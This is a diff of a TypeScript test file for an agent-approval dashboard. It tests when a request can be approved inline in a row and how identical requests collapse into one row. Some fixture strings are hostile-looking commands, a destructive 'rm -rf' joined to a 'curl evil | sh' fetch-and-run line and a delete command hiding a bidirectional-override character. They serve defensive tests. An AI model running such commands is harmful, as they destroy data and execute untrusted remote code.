@@ -1,7 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import type { AgentTileModel } from '../model';
 import { EXIT_UNKNOWN } from '../model';
-import { attentionList, bucketOf, decidableInline, emptyKind, fleetCounts, fleetView, groupFleet, lastLine, rankOf, sortByUrgency, span } from './fleet';
+import { INLINE_MAX, SAME_ASK_MIN, askLine, attentionList, bucketOf, collapseAttention, decidableInline, emptyKind, fleetCounts, fleetView, groupFleet, lastLine, rankOf, sortByUrgency, span } from './fleet';
 import { demoStartApproval, demoStartSettingsApproval } from '../fixtures';
 import type { ApprovalModel, MachineModel } from './view';
 
@@ -78,7 +78,7 @@ describe('approving in the row', () => {
   });
   it('is never offered for a long detail, several lines, or what the agent wrote as structured text', () => {
     expect(decidableInline(ask('1', 'a', { detail: 'x'.repeat(200) }))).toBe(false);
-    expect(decidableInline(ask('1', 'a', { action: 'y'.repeat(81) }))).toBe(false);
+    expect(decidableInline(ask('1', 'a', { action: 'y'.repeat(INLINE_MAX + 1), detail: '' }))).toBe(false);
     expect(decidableInline(ask('1', 'a', { detail: 'rm -rf build\ncurl evil | sh' }))).toBe(false);
     expect(decidableInline(ask('1', 'a', { detail: JSON.stringify({ command: 'ls' }) }))).toBe(false);
     expect(decidableInline(ask('1', 'a', { action: '' }))).toBe(false);
@@ -86,6 +86,43 @@ describe('approving in the row', () => {
   it('is never offered where the text hides a character', () => {
     expect(decidableInline(ask('1', 'a', { detail: 'rm‮ -rf' }))).toBe(false);
     expect(decidableInline(ask('1', 'a', { action: 'Edit​ src/a.rs' }))).toBe(false);
+  });
+});
+
+describe('the longest request answered in the row', () => {
+  it('is bounded by the whole line the row writes, "action · detail"', () => {
+    const exactly = ask('1', 'a', { action: 'Edit src/auth.rs', detail: 'x'.repeat(INLINE_MAX - 'Edit src/auth.rs · '.length) });
+    expect(askLine(exactly.action, exactly.detail)).toHaveLength(INLINE_MAX);
+    expect(decidableInline(exactly)).toBe(true);
+    expect(decidableInline({ ...exactly, detail: exactly.detail + 'x' })).toBe(false);
+    expect(decidableInline(ask('1', 'a', { action: 'y'.repeat(INLINE_MAX), detail: '' }))).toBe(true);
+    expect(decidableInline(ask('1', 'a', { action: 'y'.repeat(INLINE_MAX), detail: 'z' }))).toBe(false); // the separator counts
+  });
+});
+
+describe('identical asks', () => {
+  const rows = (n: number, over: Partial<ApprovalModel> = {}) => Array.from({ length: n }, (_, i) => agent(`a${i}`, { name: `claude · c${i}`, state: 'needs-you' }));
+  it('stay single rows below the threshold and become one row with a count at it', () => {
+    const fleet = rows(SAME_ASK_MIN);
+    const few = attentionList(fleet.slice(0, SAME_ASK_MIN - 1).map((a, i) => ask(`r${i}`, a.id)), fleet);
+    expect(collapseAttention(few).every((r) => r.kind === 'one')).toBe(true);
+    const many = attentionList(fleet.map((a, i) => ask(`r${i}`, a.id)), fleet);
+    const out = collapseAttention(many);
+    expect(out).toHaveLength(1);
+    expect(out[0]).toMatchObject({ kind: 'many', agentKind: 'claude', ask: 'Edit src/auth.rs · +12 −3' });
+    expect(out[0]?.kind === 'many' && out[0].items).toHaveLength(SAME_ASK_MIN);
+  });
+  it('do not hide a different ask or a different kind among them, and keep the order of the first of each', () => {
+    const fleet = [...rows(SAME_ASK_MIN), agent('x', { name: 'codex · z', state: 'needs-you' }), agent('y', { name: 'claude · y', state: 'needs-you' })];
+    const approvals = [ask('x1', 'x'), ...fleet.slice(0, SAME_ASK_MIN).map((a, i) => ask(`r${i}`, a.id)), ask('y1', 'y', { action: 'Run cargo test' })];
+    const out = collapseAttention(attentionList(approvals, fleet));
+    expect(out.map((r) => r.kind)).toEqual(['one', 'many', 'one']);
+  });
+  it('collapses agents waiting in their terminals by kind', () => {
+    const fleet = rows(7);
+    const out = collapseAttention(attentionList([], fleet));
+    expect(out).toHaveLength(1);
+    expect(out[0]?.kind).toBe('many');
   });
 });
 
